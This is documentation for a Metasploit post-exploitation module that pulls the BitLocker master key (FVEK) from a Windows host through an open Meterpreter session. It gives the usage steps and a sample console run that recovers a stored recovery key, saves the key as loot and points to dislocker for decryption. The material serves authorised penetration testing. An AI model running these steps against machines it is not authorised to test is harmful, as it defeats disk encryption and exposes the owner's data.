## Vulnerable Application

This module enumerates ways to decrypt Bitlocker volume and if a recovery key is stored locally or can be generated, dump the Bitlocker master key (FVEK)

## Verification Steps
  1. Start msfconsole
  2. Get meterpreter session
  3. Do: ```use post/windows/gather/bitlocker_fvek```
  4. Do: ```set SESSION <session id>```
  5. Do: ```set DRIVE_LETTER <letter>```
  6. Do: ```run```

## Options

  ***
  DRIVE_LETTER
  ***
  Dump information from the DRIVE_LETTER encrypted with Bitlocker.

  ***
  RECOVERY_KEY
  ***
  Use the recovery key provided to decrypt the Bitlocker master key (FVEK).

  ***
  SESSION
  ***
  The session to run this module on.

## Scenarios

### A run on Windows 7 (6.1 Build 7601, Service Pack 1).

  ```
  [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.6:49184) at 2019-12-11 12:51:59 -0700

  msf > use post/windows/gather/bitlocker_fvek
  msf post(windows/gather/bitlocker_fvek) > set SESSION 1
    SESSION => 1
  msf post(windows/gather/bitlocker_fvek) > set DRIVE_LETTER c
    DRIVE_LETTER => c
  msf post(windows/gather/bitlocker_fvek) > run

    [+] Successfuly opened Disk 0
    [*] Trying to gather a recovery key
    [+] Recovery key found : 579744-627517-149402-208362-055022-542289-041470-364089
    [*] The recovery key derivation usually take 20 seconds...
    [+] Successfully extract FVEK in /root/.msf4/loot/20191211125311_default_192.168.1.6_windows.file_437952.bin
    [+] This hard drive could later be decrypted using : dislocker -k <key_file> ...
    [*] Post Successful
    [*] Post module execution completed
  msf post(windows/gather/bitlocker_fvek) > sessions 1
    [*] Starting interaction with 1...

  meterpreter > sysinfo
    Computer        : TEST-PC
    OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
    Architecture    : x86
    System Language : en_US
    Domain          : DOMAIN
    Logged On Users : 1
    Meterpreter     : x86/windows
  meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
  ```
